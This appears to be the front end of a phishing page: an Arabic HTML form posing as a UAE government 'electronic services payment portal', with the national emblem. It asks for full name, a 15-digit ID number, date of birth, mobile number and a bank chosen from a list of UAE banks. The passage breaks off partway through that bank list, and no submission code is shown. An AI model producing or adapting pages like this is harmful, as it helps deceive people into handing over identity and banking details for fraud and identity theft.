<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>بوابة دفع قيمة الخدمات الإلكترونية</title>
  <style>
    body{font-family:Tahoma,Arial;background:#fff;margin:0}
    header{text-align:center;padding:20px}
    header img{height:100px}
    main{padding:20px}
    form{max-width:420px;margin:auto;background:#fff;padding:20px;border-radius:8px;box-shadow:0 0 8px rgba(0,0,0,.12)}
    label{display:block;margin-top:14px;font-weight:700}
    input,select,button{width:100%;padding:12px;margin-top:6px;border:1px solid #ccc;border-radius:6px;box-sizing:border-box}
    button{background:#0b5320;color:#fff;border:0;font-weight:800;cursor:pointer}
    button:hover{background:#094418}
    footer{background:#000;color:#fff;padding:18px 20px;margin-top:30px;font-size:13px}
  </style>
</head>
<body>
  <header>
    <!-- شعار الإمارات -->
    <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Emblem_of_the_United_Arab_Emirates.svg" alt="شعار الإمارات">
    <h2>بوابة دفع قيمة الخدمات الإلكترونية</h2>
    <p>حكومة الإمارات العربية المتحدة</p>
  </header>

  <main>
    <form id="mainForm" autocomplete="off">
      <label for="fullName">الاسم بالكامل *</label>
      <input id="fullName" required>

      <label for="idNumber">رقم الهوية (15 رقمًا) *</label>
      <input id="idNumber" type="text" required pattern="^\d{15}$" title="رقم الهوية يجب أن يتكون من 15 رقمًا" />

      <label for="dob">تاريخ الميلاد *</label>
      <div style="display:flex;gap:10px;">
        <input id="day" type="number" placeholder="يوم" min="1" max="31" required style="width:30%">
        <input id="month" type="number" placeholder="شهر" min="1" max="12" required style="width:30%">
        <input id="year" type="number" placeholder="سنة" min="1900" max="2100" required style="width:30%">
      </div>

      <label for="mobile">رقم الجوال *</label>
      <input id="mobile" type="tel" placeholder="05XXXXXXXX" required>

      <label for="bank">ادخل البنك الخاص بك *</label>
      <select id="bank" required>

        <option>بنك أبوظبي الأول</option>
        <option>بنك أبوظبي التجاري</option>
        <option>مصرف أبوظبي الإسلامي</option>
        <option>بنك الإمارات دبي الوطني</option>
        <option>بنك دبي الإسلامي</option>
        <option>بنك دبي التجاري</option>
        <option>بنك المشرق</option>
        <option>مصرف الشارقة الإسلامي</option>
        <option>بنك عجمان</option>
